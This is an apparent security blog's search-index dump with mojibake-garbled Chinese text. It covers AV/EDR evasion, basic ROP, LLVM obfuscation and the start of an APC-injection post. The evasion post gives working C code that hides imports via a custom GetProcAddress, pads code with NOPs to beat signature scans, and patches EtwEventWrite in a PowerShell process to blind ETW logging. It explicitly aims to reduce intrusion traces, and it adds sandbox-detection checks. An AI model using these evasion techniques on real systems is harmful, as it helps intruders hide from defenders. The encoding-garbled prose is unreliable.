*fnExitProcess)( _In_ UINT uExitCode);int main()&#123; // è·å– è‡ªå®šä¹‰å®ç°çš„ MyGetProcAddress å‡½æ•°åœ°å€ fnGetProcAddress pfnGetProcAddress = (fnGetProcAddress)MyGetProcAddress(); // è·å– Kernel32.dll çš„åŸºå€ HMODULE hKernel32 = (HMODULE)GetKernel32Address(); // é€šè¿‡ GetProcAddress è·å– LoadLibraryA å‡½æ•°çš„åœ°å€ï¼Œå¹¶åŠ è½½ user32.dll fnLoadLibraryA pfnLoadLibraryA=(fnLoadLibraryA)pfnGetProcAddress(hKernel32, &quot;LoadLibraryA&quot;); HMODULE hUser32 = (HMODULE)pfnLoadLibraryA(&quot;user32.dll&quot;); // é€šè¿‡ GetProcAddress è·å– MessageBoxA å‡½æ•°çš„åœ°å€ï¼Œå¹¶è°ƒç”¨è¯¥å‡½æ•° fnMessageBoxA pfnMessageBoxA=(fnMessageBoxA)pfnGetProcAddress(hUser32, &quot;MessageBoxA&quot;); pfnMessageBoxA(NULL, &quot;success&quot;, &quot;Msg&quot;, MB_OK); // é€šè¿‡ GetProcAddress è·å– ExitProcess å‡½æ•°çš„åœ°å€ï¼Œå¹¶è°ƒç”¨è¯¥å‡½æ•° fnExitProcess pfnExitProcess=(fnExitProcess)pfnGetProcAddress(hKernel32, &quot;ExitProcess&quot;); pfnExitProcess(0); return 0;&#125; è¿™æ®µä»£ç åªæ˜¯ä¸€ä¸ªå°demoï¼Œé€šè¿‡å®ç°æˆ‘ä»¬è‡ªå·±çš„GetProcAddresså‡½æ•°ï¼Œæ¥åŠ è½½å„ç§APIå‡½æ•°ï¼Œè¾¾åˆ°ç»•è¿‡å¯¼å…¥è¡¨çš„ç›®çš„ã€‚ èŠ±æŒ‡ä»¤å…æ€ä¸€äº›å‚å•†åœ¨æ£€æµ‹ç‰¹å¾ç æ—¶ï¼Œä¼šå­˜åœ¨ä¸€ä¸ªåç§»èŒƒå›´ï¼Œæˆ‘ä»¬åªè¦å¡«å……åƒåœ¾æ•°æ®è¶…è¿‡è¿™ä¸ªåç§»èŒƒå›´ï¼Œå°±å¯ä»¥åšåˆ°èº²é¿æ£€æµ‹çš„æ•ˆæœã€‚ä½†æ¯•ç«Ÿæ˜¯çŒœæµ‹çš„åç§»èŒƒå›´ï¼Œå¤±è´¥çš„æ¦‚ç‡è¿˜æ˜¯ä¸å°çš„ã€‚æ¯”å¦‚æˆ‘ä»¬åœ¨ä¸Šè¿°è·å–è·å– Kernel32.dll çš„åŸºå€çš„å‡½æ•°ä¸­æ·»åŠ nopï¼Œå¯èƒ½ä¼šå¯¹ç»•è¿‡æ€è½¯æœ‰å¸®åŠ© 123456789101112131415161718192021222324252627282930313233343536373839DWORD dwKernel32Addr = 0;_asm &#123; push eax nop nop nop nop mov eax, dword ptr fs:[0x30] nop nop nop nop mov eax, [eax + 0x0c] nop nop nop nop mov eax, [eax + 0x1C] nop nop nop nop mov eax, [eax] nop nop nop nop mov eax, [eax + 0x08] nop nop nop nop mov dwKernel32Addr, eax nop nop nop nop pop eax&#125; ç¦ç”¨ETWâ€‹ å…ˆæ¥äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯ETWã€‚æŒ‰ç…§æˆ‘çš„ç†è§£,å°±æ˜¯windowsæä¾›çš„äº‹ä»¶è·Ÿè¸ªæ—¥å¿—ç³»ç»Ÿï¼Œç”¨äºç³»ç»Ÿå’Œåº”ç”¨è¯Šæ–­ã€æ•…éšœæ’é™¤å’Œæ€§èƒ½ç›‘è§†ï¼ŒåŒæ ·ä¹Ÿå¯ä»¥ç”¨æ¥ç›‘è§†execute-assemblyç­‰åŠŸèƒ½çš„è¡Œä¸ºæ“ä½œã€‚é‚£ä¹ˆä¸ºäº†ç•™ä¸‹æ›´å°‘çš„å…¥ä¾µç—•è¿¹ï¼Œå°±å¯ä»¥ç¦ç”¨ETWã€‚ é€šè¿‡ç ”ç©¶å¤§ä½¬çš„åšå®¢ï¼ŒETWå°†TRUEå¸ƒå°”å‚æ•°ä¼ é€’åˆ°nt!EtwpStopTraceå‡½æ•°ä¸­ï¼Œä»¥æŸ¥æ‰¾ETWç‰¹å®šç»“æ„å¹¶åŠ¨æ€ä¿®æ”¹ntdll!ETWEventWriteç«‹å³è¿”å›ä»è€Œåœæ­¢è·Ÿè¸ªæ—¥å¿—è®°å½•ã€‚å…³é”®ç‚¹å°±æ˜¯ntdll!ETWEventWrite å…ˆæŸ¥çœ‹äº§ç”Ÿå¤§é‡æ—¥å¿—çš„ç¨‹åºæ˜¯ä»€ä¹ˆæ ·å­ï¼Œä»¥powershellä¸ºä¾‹ æ¥ç€å¯ä»¥patch ntdll!EtwEventWriteå‡½æ•°æ¥æŸ¥çœ‹æ˜¯å¦ç¦ç”¨äº†ETWã€‚ åœ¨å°†powershellè¿›ç¨‹é™„åŠ åˆ°x64dbgä¸­ï¼Œåœ¨ntdll!EtwEventWriteä¸Šä¸‹æ–­ç‚¹ ä¸€èˆ¬windows apié»˜è®¤ä½¿ç”¨stdcall(x86)è°ƒç”¨çº¦å®šï¼Œè¿™é‡Œx64é»˜è®¤ä½¿ç”¨fastcallï¼Œå³å¯„å­˜å™¨ä¼ å‚ï¼Œè¢«è°ƒç”¨è€…æ¸…ç†å †æ ˆï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥è¿”å›ï¼ˆretï¼‰å°±å¥½ã€‚ ä¹‹åF9è¿è¡Œ,åœ¨processhackerä¸­æŸ¥çœ‹æ—¥å¿—ä¿¡æ¯ å·²ç»è¯»å–ä¸åˆ°æ‰€æœ‰ä¿¡æ¯ã€‚ ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;Tlhelp32.h&gt;int main() &#123; STARTUPINFOA si = &#123;0&#125;; PROCESS_INFORMATION pi = &#123; 0 &#125;; si.cb = sizeof(si); //å¯åŠ¨ä¸€ä¸ª PowerShell è¿›ç¨‹ï¼Œå¹¶å°†è¿›ç¨‹ä¿¡æ¯ä¿å­˜åœ¨ pi ä¸­ CreateProcessA(NULL, (LPSTR)&quot;powershell -NoExit&quot;, NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi); //è·å– ntdll.dll ä¸­çš„ EtwEventWrite å‡½æ•°çš„åœ°å€ HMODULE hNtdll = GetModuleHandleA(&quot;ntdll.dll&quot;); LPVOID pEtwEventWrite = GetProcAddress(hNtdll, &quot;EtwEventWrite&quot;); //Sleep(500); DWORD oldProtect; //ret char patch = 0xc3; //å°† EtwEventWrite å‡½æ•°çš„å†…å­˜é¡µè®¾ç½®ä¸ºå¯è¯»å†™æ‰§è¡Œ VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &amp;oldProtect); //å°†ç¬¬ä¸€ä¸ªå­—èŠ‚ä¿®æ”¹ä¸º ret æŒ‡ä»¤ WriteProcessMemory(pi.hProcess, (LPVOID)pEtwEventWrite, &amp;patch, sizeof(char),NULL); //ä¿®æ”¹è¿‡çš„å†…å­˜é¡µçš„ä¿æŠ¤å±æ€§æ¢å¤ä¸ºä¿®æ”¹ä¹‹å‰çš„çŠ¶æ€ VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, 1, oldProtect, NULL); //ResumeThread æ¢å¤ PowerShell è¿›ç¨‹çš„æ‰§è¡Œ ResumeThread(pi.hThread); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); //FreeLibrary(hNtdll); return 0;&#125; ä¸è¿‡å®Œå…¨ç¦ç”¨å¹¶ä¸æ˜¯æœ€å¥½çš„æƒ³æ³•ï¼Œå½“é˜²å¾¡è€…å‘ç°ä¸€æ¡æ—¥å¿—ä¹Ÿæ²¡æœ‰ï¼Œé‚£ä¹Ÿå°±è¯´æ˜é­åˆ°äº†å…¥ä¾µã€‚æˆ‘ä»¬è¦åšçš„åº”è¯¥æ˜¯æä¾›è™šå‡ä¿¡æ¯æˆ–è€…è¿‡æ»¤åˆ°æˆ‘ä»¬ä¸æƒ³è®©é˜²å¾¡è€…çœ‹åˆ°çš„ä¿¡æ¯ è°ƒç”¨ç³»ç»Ÿçº§å‡½æ•°ç›´æ¥ç³»ç»Ÿè°ƒç”¨æ˜¯ç›´æ¥å¯¹å†…æ ¸ç³»ç»Ÿè°ƒç”¨ç­‰æ•ˆçš„ WINAPI è°ƒç”¨ã€‚æˆ‘ä»¬ä¸è°ƒç”¨ ntdll.dll VirtualAllocï¼Œè€Œæ˜¯è°ƒç”¨å®ƒåœ¨ Windows å†…æ ¸ä¸­å®šä¹‰çš„å†…æ ¸ç­‰æ•ˆ NtAlocateVirtualMemoryã€‚è¿™å°±é¿å…äº†EDRåœ¨ç”¨æˆ·å±‚å¯¹ntdllçš„æ£€æµ‹ã€‚ çº¢é˜Ÿæˆ˜æœ¯ï¼šç»“åˆç›´æ¥ç³»ç»Ÿè°ƒç”¨å’Œ sRDI ç»•è¿‡ AV&#x2F;EDR |åŒ…æŠ„ (outflank.nl) åˆ é™¤æˆ–è¦†ç›–ntdllé‡Œé¢çš„hookhlldz&#x2F;RefleXXionï¼šRefleXXion æ˜¯ä¸€ä¸ªå®ç”¨ç¨‹åºï¼Œæ—¨åœ¨å¸®åŠ©ç»•è¿‡ AV&#x2F;EPP&#x2F;EDR ç­‰ä½¿ç”¨çš„ç”¨æˆ·æ¨¡å¼é’©å­ã€‚ä¸ºäº†ç»•è¿‡ç”¨æˆ·æ¨¡å¼é’©å­ï¼Œå®ƒé¦–å…ˆæ”¶é›† LdrpThunkSignature æ•°ç»„ä¸­æ‰¾åˆ°çš„ NtOpenFileã€NtCreateSectionã€NtOpenSection å’Œ NtMapViewOfSection çš„ç³»ç»Ÿè°ƒç”¨å·ã€‚ (github.com) EDR å¹¶è¡Œåˆ†æ - MDSec æ¬ºéª—çº¿ç¨‹è°ƒç”¨å †æ ˆå¦‚ä½•ä½¿ç”¨ThreadStackSpooferéšè—Shellcodeçš„å†…å­˜åˆ†é…è¡Œä¸º-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com) beacon&#x2F;shellcode å†…å­˜åŠ å¯†Sangforåä¸œå¤©å‹‡æˆ˜é˜Ÿï¼šå†…å­˜è§„é¿ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· ä¸ä½¿ç”¨RWXå†…å­˜æ— å¯æ‰§è¡Œæƒé™åŠ è½½ ShellCode - HexNy0a - åšå®¢å›­ (cnblogs.com) ä½œè€…çš„æ€è·¯å°±æ˜¯ä¸å°†shellcodeå†™å…¥å†…å­˜ï¼Œé¿å…æ£€æµ‹åˆ°shellcodeçš„ç‰¹å¾ç ï¼Œæ¥ç€é€šè¿‡è§£é‡Šå™¨å»è§£é‡Šè¿è¡Œshellcodeï¼Œè¾¾åˆ°â€œä¸è§shellcodeï¼Œæ‰§è¡Œshellcodeâ€çš„æ“ä½œã€‚ä¸è¿‡ä»å¦ä¸€ä¸ªè§’åº¦æ¥çœ‹ï¼Œå°±æ˜¯å°†shellcodeå†™å…¥åˆ°å¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜ä¸­ï¼Œå˜ä¸ºå°†è§£é‡Šå™¨å†™å…¥åˆ°å¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜ä¸­å»ã€‚ é’ˆå¯¹æ²™ç®±æ£€æµ‹è™šæ‹Ÿæœºç‰¹å¾å€¼æ£€æµ‹æ˜¯å¦å­˜åœ¨ \\\\Device\\\\VBoxGuestè®¾å¤‡æ–‡ä»¶ æ£€æµ‹æ˜¯å¦å­˜åœ¨è®¾å¤‡ååŒ…å« VBOX å…³é”®å­—æˆ–è€… VMWARE å…³é”®å­— æ£€æµ‹è™šæ‹Ÿæœºä¸­ç‰¹æœ‰çš„è¿›ç¨‹ æ£€æµ‹æ˜¯å¦å­˜åœ¨è™šæ‹Ÿæœºç‰¹æœ‰çš„æ³¨å†Œè¡¨é”®å€¼ æ£€æµ‹æ˜¯å¦å­˜åœ¨è™šæ‹Ÿæœºç‰¹æœ‰çš„æ–‡ä»¶ æ£€æµ‹ç³»ç»Ÿç¯å¢ƒå¯åŠ¨æ—¶é—´","categories":[{"name":"bypass","slug":"bypass","permalink":"https://e1ectr0nlc.github.io/categories/bypass/"}],"tags":[]},{"title":"åŸºç¡€ROP","slug":"Rop","date":"2023-08-15T16:00:00.000Z","updated":"2024-05-12T13:38:54.781Z","comments":true,"path":"2023/08/16/Rop/","permalink":"https://e1ectr0nlc.github.io/2023/08/16/Rop/","excerpt":"çº¿ä¸‹æ¯”èµ›å¤šä¸ºAWDï¼Œæ¶‰åŠåˆ°é€†å‘çš„çŸ¥è¯†ç‚¹å¾ˆå°‘ã€‚ä¸ºäº†åœ¨çº¿ä¸‹ä¸åç‰¢æŒ‡æ‰“å¼€ç”µè„‘æ— æ‰€äº‹äº‹ç–¯ç‹‚å·åƒèŒ¶æ­‡åŒºé›¶é£Ÿ ï¼Œæ¥è®°å½•è‡ªå·±å­¦ä¹ pwnçš„å…¥é—¨çŸ¥è¯†","text":"çº¿ä¸‹æ¯”èµ›å¤šä¸ºAWDï¼Œæ¶‰åŠåˆ°é€†å‘çš„çŸ¥è¯†ç‚¹å¾ˆå°‘ã€‚ä¸ºäº†åœ¨çº¿ä¸‹ä¸åç‰¢æŒ‡æ‰“å¼€ç”µè„‘æ— æ‰€äº‹äº‹ç–¯ç‹‚å·åƒèŒ¶æ­‡åŒºé›¶é£Ÿ ï¼Œæ¥è®°å½•è‡ªå·±å­¦ä¹ pwnçš„å…¥é—¨çŸ¥è¯† ä¿æŠ¤Canaryæ˜¯ä¸€ç§æ ˆæº¢å‡ºä¿æŠ¤æœºåˆ¶ã€‚åœ¨å‡½æ•°è¿”å›å‰ä¼šæ£€æŸ¥ä¸€ä¸ªç”Ÿæˆçš„éšæœºæ•°ï¼Œå¦‚æœéšæœºæ•°è¢«åƒåœ¾æ•°æ®è¦†ç›–æˆ–è€…è¢«ç¯¡æ”¹ï¼Œå°±ä¼šæŠ¥é”™ã€‚ NXç±»ä¼¼äºWindowsä¸‹çš„DEPï¼Œå°†å†…å­˜é¡µæ”¹ä¸ºä¸å¯æ‰§è¡Œã€‚å°†ç¨‹åºçš„.textæ®µæ ‡è®°ä¸ºå¯æ‰§è¡Œï¼Œè€Œ.dataã€.bssã€.rodataä»¥åŠå †æ ˆåŒºåŸŸå‡æ ‡è®°ä¸ºä¸å¯æ‰§è¡Œã€‚æ‰€ä»¥æ²¡æœ‰åŠæ³•ä½¿ç”¨ret2shellcodeçš„æ–¹æ³•è¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚ PIEåœ°å€éšæœºåŒ–ä¿æŠ¤ã€‚ æ¼æ´åˆ©ç”¨æ–¹å¼ret2textåœ¨æˆ‘çš„ç†è§£ä¸­ï¼Œè¿™å°±æ˜¯æœ€ç®€å•çš„æ¼æ´åˆ©ç”¨æ–¹å¼ã€‚ é€šè¿‡æ ˆæº¢å‡ºä¿®æ”¹å‡½æ•°çš„è¿”å›åœ°å€ï¼Œä¹Ÿå­˜åœ¨ç³»ç»Ÿè°ƒç”¨å‡½æ•°ä½¿ç”¨ï¼ŒåŒæ—¶ç³»ç»Ÿè°ƒç”¨çš„å‘½ä»¤ä¹Ÿæ­£å¥½æ˜¯/bin/shï¼Œè·å–åˆ°shellã€‚ ret2shellcodeå½“æ²¡æœ‰ç³»ç»Ÿå‡½æ•°åœ¨ç¨‹åºä¸­ï¼Œæˆ‘ä»¬åªèƒ½è‡ªå·±å†™è¿›å»ä¸€ä¸ªshellcodeå»æ‰§è¡Œã€‚ é€šè¿‡åœ¨æ ˆæº¢å‡ºçš„åƒåœ¾æ•°æ®ä¸­åŠ å…¥shellcodeï¼Œä¿®æ”¹è¿”å›åœ°å€åˆ°shellcodeçš„åœ°å€è¿è¡Œå³å¯ ret2syscallå½“ç¨‹åºåŠ å…¥NXä¿æŠ¤ï¼ŒåŒæ—¶æ²¡æœ‰ç³»ç»Ÿè°ƒç”¨å‡½æ•°æ¥ä½¿ç”¨ï¼Œå°±éœ€è¦è¿™ç§æ¼æ´åˆ©ç”¨æ‰‹æ³•ï¼Œé€šè¿‡è§¦å‘0x80å·ä¸­æ–­è¿›è¡Œç³»ç»Ÿè°ƒç”¨ã€‚ æ€è·¯å¦‚ä¸‹ï¼š å°†ç³»ç»Ÿè°ƒç”¨çš„ç¼–å·å­˜å…¥EAXã€‚ä¾‹å¦‚è¦è°ƒç”¨execï¼Œå¯¹åº”çš„ç¼–å·å°±æ˜¯0xbã€‚ å°†å‡½æ•°çš„å…¶ä»–å‚æ•°å­˜å…¥å¯„å­˜å™¨ã€‚ä¾‹å¦‚è°ƒç”¨exec, eax&#x3D;0xb, ebx&#x3D;&#x2F;bin&#x2F;sh çš„åœ°å€, ecx&#x3D;0, edx&#x3D;0 è§¦å‘0x80ä¸­æ–­ å¦‚ä½•å‘å¯„å­˜å™¨ä¸­å¡«å…¥æ•°æ®ï¼Ÿéœ€è¦åˆ©ç”¨gadgetsï¼ˆå°ç‰‡æ®µï¼‰æ¥å®ç° æ‰€è°“çš„gadgetså°±æ˜¯ä»¥ ret ç»“å°¾çš„æŒ‡ä»¤åºåˆ—ï¼Œé€šè¿‡è¿™äº›æŒ‡ä»¤åºåˆ—ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æŸäº›åœ°å€çš„å†…å®¹ï¼Œæ–¹ä¾¿æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚ ä¾‹å¦‚ï¼š 1pop eax ; ret è¿™æ®µä»£ç çš„ä½œç”¨å°±æ˜¯å°†æ ˆé¡¶çš„æ•°æ®å¼¹å‡ºç»™eaxï¼Œç„¶åå†å°†æ ˆé¡¶çš„æ•°æ®ä½œä¸ºè¿”å›åœ°å€è¿”å›ã€‚ æˆ‘ä»¬åªéœ€è¦popå‡ºæ ˆé¡¶çš„æ•°æ®åˆ°å¯¹åº”å¯„å­˜å™¨ä¸­ï¼Œæ¥ç€åœ¨æ–°çš„æ ˆé¡¶å¡«å…¥è¦retçš„åœ°å€å³å¯ï¼Œå°±å¯ä»¥åšåˆ°è¿™ç§æ”»å‡»æ‰‹æ³•ã€‚ ret2libcå½“ç¨‹åºä¸­æ—¢æ²¡æœ‰è°ƒç”¨systemå‡½æ•°ä¹Ÿæ²¡æœ‰/bin/shå­—ç¬¦ï¼ŒåŒæ—¶ç¨‹åºå¼€å¯NXä¿æŠ¤ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥è€ƒè™‘ä½¿ç”¨libcå½“ä¸­çš„å‡½æ•°ï¼Œå…¶ä¸­å°è£…äº†å¸¸ç”¨çš„å‡½æ•°ï¼Œæ¯”å¦‚å¸¸ç”¨çš„printfï¼Œgetå‡½æ•°ã€‚åœ¨æ¯ä¸ªlibcåº“ä¸­çš„å‡½æ•°çš„åç§»éƒ½æ˜¯ç›¸å¯¹çš„ï¼Œåªè¦è·å–åˆ°libcçš„åŸºåœ°å€ï¼Œå†åŠ ä¸Šå‡½æ•°çš„åç§»å€¼ï¼Œå°±å¯ä»¥è°ƒç”¨è¯¥å‡½æ•°ã€‚libcåº“ä¸­ä¹Ÿå­˜åœ¨å­—ç¬¦ä¸²/bin/shã€‚éœ€è¦æ³¨æ„çš„æ˜¯ä¸åŒç‰ˆæœ¬çš„libcå¯¹åº”çš„å‡½æ•°åç§»ä¸ä¸åŒã€‚ å¦‚ä½•è·å–libcåŸºåœ°å€ï¼Ÿ é¦–å…ˆé€šè¿‡å»¶è¿Ÿç»‘å®šæœºåˆ¶è·å–åˆ°gotè¡¨ä¸­çš„å‡½æ•°çœŸå®åœ°å€ï¼Œé€šè¿‡æŸ¥æ‰¾å¯¹åº”libcä¸­å‡½æ•°çš„åç§»ï¼Œä½¿ç”¨çœŸå®åœ°å€å‡å»å‡½æ•°åç§»å³å¯è·å¾—libcåŸºåœ°å€ã€‚ ä¹‹åé€šè¿‡åŸºåœ°å€åŠ ä¸Šå½“å‰ç‰ˆæœ¬çš„å‡½æ•°åç§»å³å¯å®ç°è°ƒç”¨ã€‚","categories":[{"name":"æ¼æ´åˆ©ç”¨","slug":"æ¼æ´åˆ©ç”¨","permalink":"https://e1ectr0nlc.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}],"tags":[]},{"title":"LLVMæ··æ·†ä¸å»é™¤","slug":"llvmæ··æ·†ä¸å»é™¤","date":"2023-08-11T16:00:00.000Z","updated":"2024-05-13T03:35:12.276Z","comments":true,"path":"2023/08/12/llvmæ··æ·†ä¸å»é™¤/","permalink":"https://e1ectr0nlc.github.io/2023/08/12/llvm%E6%B7%B7%E6%B7%86%E4%B8%8E%E5%8E%BB%E9%99%A4/","excerpt":"å›½èµ›é‡åˆ°äº†ç»è¿‡æ§åˆ¶æµå¹³å¦åŒ–çš„ä¸€é“é¢˜ã€‚ä»Šå¤©æ¥è®°å½•ä¸€ä¸‹LLVMç¯å¢ƒçš„ä½¿ç”¨","text":"å›½èµ›é‡åˆ°äº†ç»è¿‡æ§åˆ¶æµå¹³å¦åŒ–çš„ä¸€é“é¢˜ã€‚ä»Šå¤©æ¥è®°å½•ä¸€ä¸‹LLVMç¯å¢ƒçš„ä½¿ç”¨ æ··æ·†å…³äºæ··æ·†çš„ç¯å¢ƒæ­å»ºä¸å†èµ˜è¿°ï¼Œç½‘ä¸Šå·²æœ‰ä¸å°‘è¯¦ç»†çš„è¯´æ˜ï¼Œæœ¬ç¯‡åªæ¥ä»‹ç»å¦‚ä½•ä½¿ç”¨æ­å»ºåçš„ç¯å¢ƒã€‚ æ§åˆ¶æµå¹³å¦åŒ–1clang -mllvm -fla test.cpp -o test1 å¯ç”¨é€‰é¡¹ -mllvm -fla : æ¿€æ´»æ§åˆ¶æµå¹³å¦åŒ– -mllvm -split : æ¿€æ´»åŸºæœ¬å—åˆ†å‰² -mllvm -split_num&#x3D;3 : æŒ‡å®šåŸºæœ¬å—åˆ†å‰²çš„æ•°ç›® ä¾‹å¦‚ 1clang -mllvm -fla -mllvm -split -mllvm -split_num=3 test.cpp -o test_fla æŒ‡ä»¤æ›¿æ¢1clang -mllvm -sub test.cpp -o test2 -mllvm -sub : æ¿€æ´»æŒ‡ä»¤æ›¿ä»£ -mllvm -sub_loop&#x3D;3 : æ··æ·†æ¬¡æ•°ï¼Œè¿™é‡Œä¸€ä¸ªå‡½æ•°ä¼šè¢«æ··æ·†3æ¬¡ï¼Œé»˜è®¤ä¸º 1æ¬¡ ä¾‹å¦‚ 1clang -mllvm -sub -mllvm -sub_loop=3 test.cpp -o test_sub æ§åˆ¶æµä¼ªé€ 1clang -mllvm -bcf test.cpp -o test3 -mllvm -bcf : æ¿€æ´»è™šå‡æ§åˆ¶æµ -mllvm -bcf_loop&#x3D;3 : æ··æ·†æ¬¡æ•°ï¼Œè¿™é‡Œä¸€ä¸ªå‡½æ•°ä¼šè¢«æ··æ·†3æ¬¡ï¼Œé»˜è®¤ä¸º 1 -mllvm -bcf_prob&#x3D;40 : æ¯ä¸ªåŸºæœ¬å—è¢«æ··æ·†çš„æ¦‚ç‡ï¼Œè¿™é‡Œæ¯ä¸ªåŸºæœ¬å—è¢«æ··æ·†çš„æ¦‚ç‡ä¸º40%ï¼Œé»˜è®¤ä¸º 30 % ä¾‹å¦‚ 1clang -mllvm -bcf -mllvm -bcf_loop=3 -mllvm -bcf_prob=40 test.cpp -o test_bcf ä¿æŠ¤å…¨å¼€ 1clang -mllvm -bcf -mllvm -fla -mllvm -sub test.cpp -o test_bcf å»é™¤å»é™¤æ§åˆ¶æµå¹³å¦åŒ–é¦–å…ˆè¿›å…¥è™šæ‹Ÿpythonç¯å¢ƒä¸­ 1workon angr_work æ¥ç€åœ¨idaæŸ¥çœ‹æ··æ·†å‡½æ•°çš„èµ·å§‹åœ°å€ æ¯”å¦‚æˆ‘è¿™é‡Œçš„å‡½æ•°èµ·å§‹åœ°å€ä¸º0x400CB0 1python3 deflat.py -f test1 --addr 0x400CB0 æœ€åä¼šæ¢å¤ä¸€ä¸ªfilename_recoveredçš„æ–‡ä»¶ï¼Œå†æ¬¡æ”¾å…¥idaä¸­æŸ¥çœ‹ å»é™¤æ§åˆ¶æµä¼ªé€ 12python3 debogus.py -f test1 --addr 0x400D30python3 debogus.py -f test1 -s 0x400D30 è¿™ä¸ªè„šæœ¬è¿è¡Œæˆ‘è‡ªå·±çš„ç¼–è¯‘çš„ç¨‹åºå¤±è´¥äº†ï¼Œä¼°è®¡ä¸ç¯å¢ƒé—®é¢˜æœ‰å…³","categories":[{"name":"ä»£ç ä¿æŠ¤","slug":"ä»£ç ä¿æŠ¤","permalink":"https://e1ectr0nlc.github.io/categories/%E4%BB%A3%E7%A0%81%E4%BF%9D%E6%8A%A4/"}],"tags":[]},{"title":"APCæ³¨å…¥","slug":"APCæ³¨å…¥","date":"2023-07-19T16:00:00.000Z","updated":"2024-05-13T03:30:44.105Z","comments":true,"path":"2023/07/20/APCæ³¨å…¥/","permalink":"https://e1ectr0nlc.github.io/2023/07/20/APC%E6%B3%A8%E5%85%A5/","excerpt":"APCæ³¨å…¥åˆ©ç”¨äº†å½“å‰çº¿ç¨‹ä»ä¸­æ–­ä¸­æ¢å¤æ—¶ä¼šæ£€æŸ¥APCé˜Ÿåˆ—ä¸­æ˜¯å¦æœ‰å‡½æ•°æœªæ‰§è¡Œè¿›è¡Œå‡½æ•°è°ƒç”¨æ¥æ³¨å…¥ã€‚","text":"APCæ³¨å…¥åˆ©ç”¨äº†å½“å‰çº¿ç¨‹ä»ä¸­æ–­ä¸­æ¢å¤æ—¶ä¼šæ£€æŸ¥APCé˜Ÿåˆ—ä¸­æ˜¯å¦æœ‰å‡½æ•°æœªæ‰§è¡Œè¿›è¡Œå‡½æ•°è°ƒç”¨æ¥æ³¨å…¥ã€‚ æ¦‚å¿µé¦–å…ˆæ¥äº†è§£ä¸‹ä»€ä¹ˆæ˜¯APCæŠ€æœ¯ã€‚APCå…¨ç§°ä¸ºå¼‚æ­¥è¿‡ç¨‹è°ƒç”¨ï¼Œå®ƒå…è®¸ä¸€ä¸ªçº¿ç¨‹è¯·æ±‚å¦ä¸€ä¸ªçº¿ç¨‹åœ¨é€‚å½“çš„æ—¶å€™å¼‚æ­¥æ‰§è¡Œä¸€ä¸ªç‰¹å®šçš„å‡½æ•°ã€‚é€šä¿—æ¥è®²ï¼Œå½“ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨ä¸€ä¸ªé˜»å¡çš„ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œä¾‹å¦‚SleepEx(),WaitForSingleObjectEx()ç­‰ï¼Œå†…æ ¸æ€è¿”å›çš„æ—¶å€™ä¼šæ£€æŸ¥æ˜¯å¦éœ€è¦æ‰§è¡Œ apc ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨APCæ¥åœ¨ç³»ç»Ÿè°ƒç”¨å®Œæˆæ—¶æ‰§è¡Œä¸€äº›é¢å¤–çš„ä»£ç ï¼Œè€Œä¸éœ€è¦ç­‰å¾…ç³»ç»Ÿè°ƒç”¨è¿”å›ã€‚ å®ç°æ€è·¯é€‚ç”¨ç¨‹åºï¼š 1.å¤šçº¿ç¨‹ç¨‹åºï¼› 2.ä¼šè°ƒç”¨SleepEx()ã€WaitForSingleObjectEx()ã€WaitForMultipleObjectsEx()ã€SignalObjectAndWait()ç­‰å‡½æ•°ã€‚ æµç¨‹ï¼š å½“EXEé‡ŒæŸä¸ªçº¿ç¨‹æ‰§è¡Œåˆ°SleepEx()æˆ–è€…WaitForSingleObjectEx()æ—¶ï¼Œç³»ç»Ÿå°±ä¼šäº§ç”Ÿä¸€ä¸ªè½¯ä¸­æ–­ã€‚ å½“çº¿ç¨‹å†æ¬¡è¢«å”¤é†’æ—¶ï¼Œæ­¤çº¿ç¨‹ä¼šé¦–å…ˆæ‰§è¡ŒAPCé˜Ÿåˆ—ä¸­çš„è¢«æ³¨å†Œçš„å‡½æ•°ã€‚ åˆ©ç”¨QueueUserAPC()è¿™ä¸ªAPIå¯ä»¥åœ¨è½¯ä¸­æ–­æ—¶å‘çº¿ç¨‹çš„APCé˜Ÿåˆ—æ’å…¥ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå¦‚æœæˆ‘ä»¬æ’å…¥çš„æ˜¯Loadlibrary()æ‰§è¡Œå‡½æ•°çš„è¯ï¼Œå°±èƒ½è¾¾åˆ°æ³¨å…¥DLLçš„ç›®çš„ã€‚ ä»£ç é€šè¿‡å¿«ç…§è·å–å±äºç›®æ ‡è¿›ç¨‹çš„æ‰€æœ‰çº¿ç¨‹ï¼Œ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135#include &lt;iostream&gt; #include &lt;Windows.h&gt;#include &lt;TlHelp32.h&gt;using namespace std;// è·å–å¯¹åº”è¿›ç¨‹Idçš„æ‰€æœ‰çº¿ç¨‹IdBOOL GetAllThreadIdByProcessId(DWORD dwPid, DWORD** ppThreadIdList, LPDWORD pThreadIdListLength)&#123; //çº¿ç¨‹IDæ•°ç»„ä¸­å½“å‰çš„çº¿ç¨‹IDæ•°é‡ DWORD dwThreadIdListLength = 0; //çº¿ç¨‹IDæ•°ç»„çš„æœ€å¤§å®¹é‡ DWORD dwThreadIdListMaxCount = 2000; 